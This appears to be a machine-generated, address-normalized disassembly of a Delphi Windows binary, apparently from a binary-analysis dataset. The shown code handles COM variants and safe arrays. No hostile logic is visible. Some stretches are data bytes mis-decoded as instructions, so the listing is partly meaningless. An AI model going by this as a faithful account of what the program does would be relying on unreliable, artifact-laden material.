inc edi
add al bh
outsb
add [ eax ] al
adc [ edx ] al
inc edi
add [ eax + 0x476e ] dh
add [ edx + eax ] bh
inc edi
add [ eax + 0x34004771 ] al
add al [ edi ]
movsb [ edi ] [ esi ]
outsb
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x72ec0047 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x4701 ] bl
outsd
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x72540047 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0xbffb8ff ] dh
jno r-xdata
mov ecx 0x16
mov edx [ sub_40b924 ]
call sub_404968
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404968
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404968
mov eax rw-data
call sub_403eec
mov eax rw-data
mov edx [ r-xdata ]
call sub_4050ac
mov eax rw-data
mov edx [ r-xdata ]
call sub_4050ac
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404968
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404968
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404968
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404968
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404968
mov eax rw-data
call sub_403eec
mov eax rw-data
call sub_403eec
mov eax rw-data
call sub_403eec
mov eax rw-data
call sub_403eec
mov eax rw-data
call sub_403eec
mov eax rw-data
call sub_403eec
mov eax rw-data
call sub_403eec
mov eax rw-data
call sub_403eec
mov eax rw-data
call sub_4045cc
mov eax rw-data
call sub_403eec
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] ah
inc edi
add [ eax + 0x6f ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40d581
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add eax rw-data
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x70e00047 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x73ffb8ff ] cl
jb r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x6e940047 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x24004701 ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x70e40047 ] ch
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d588
retn
mov eax rw-data
call sub_40cfec
call sub_40cb58
call sub_40be4c
mov eax rw-data
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x47 ] ah
add [ eax ] dh
jo r-xdata
sub_40d58c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d5f4
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5fb
retn
mov eax sub_40d13c
call sub_403c98
mov eax r-xdata
call sub_403cc0
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bdc8
call sub_40becc
call sub_40cb78
call sub_40c710
mov eax rw-data
mov edx r-xdata
call sub_403f40
sub_40d62c
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d680
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d6da
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408110
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d6e1
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40d6ec
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d746
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409450
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d74d
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40d758
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d7b2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409424
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7b9
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40d7c4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d81e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40ae78
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d825
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40d830
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d88a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40947c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d891
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40d89c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d909
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_40821c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d910
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
sub_40d91c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d97c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4093d8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404718
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d983
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40d98c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d9ec
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a604
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404718
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d9f3
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40d9fc
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40da60
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4082b8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404718
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da67
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40da90
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40dabc
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d62c
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d65c
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d65c
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d668
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d668
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d668
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d668
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d668
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d668
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d668
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d668
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d668
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d674
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d680
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ec
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d758
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7c4
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d830
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d89c
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d91c
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d98c
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9fc
mov eax r-xdata
call sub_40da90
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40ddc8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40dded
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ddf4
retn
sub_40e448
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e492
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e499
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40e49c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e52b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413c18
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413c18
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e532
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f10
retn
sub_40e538
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e582
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e589
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40e58c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e5d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5dd
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40e5e0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e66f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413c18
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413c18
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e676
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f10
retn
sub_40e67c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e6c6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e6cd
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40e6d0
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e915
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e91c
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f10
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403f10
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
jmp r-xdata
dec eax
je r-xdata
call sub_40e448
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
jmp r-xdata
jmp r-xdata
call sub_40e538
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40af04
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
jmp r-xdata
jmp r-xdata
sub_40e930
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e49c
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e5e0
jmp r-xdata
jmp r-xdata
call sub_40e6d0
sub_40e964
push ebx
push esi
mov esi edx
mov ebx eax
call sub_402784
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
call sub_402784
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40e930
pop esi
pop ebx
retn
call sub_402784
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40e930
jmp r-xdata
call sub_4027c4
mov edx eax
mov eax edx
call sub_403928
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40e930
jmp r-xdata
pop esi
pop ebx
retn
sub_40e9e8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ea32
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea39
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40ea50
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ea80
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ea80
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40eadc
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e924
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e924
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ea50
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e924
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e924
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40ea80
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e924
mov eax [ ebp - 0x314 ]
call sub_40ecd4
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40ec58
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e924
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403eec
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_4141e8
test al al
je r-xdata
mov eax ebx
call sub_40eadc
jmp r-xdata
push ebx
call VariantClear
call sub_40e924
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40ecf0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ed20
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ed20
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ed7c
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e924
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e924
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40ecd4
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e67c
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e924
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e924
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ecf0
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40ed20
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
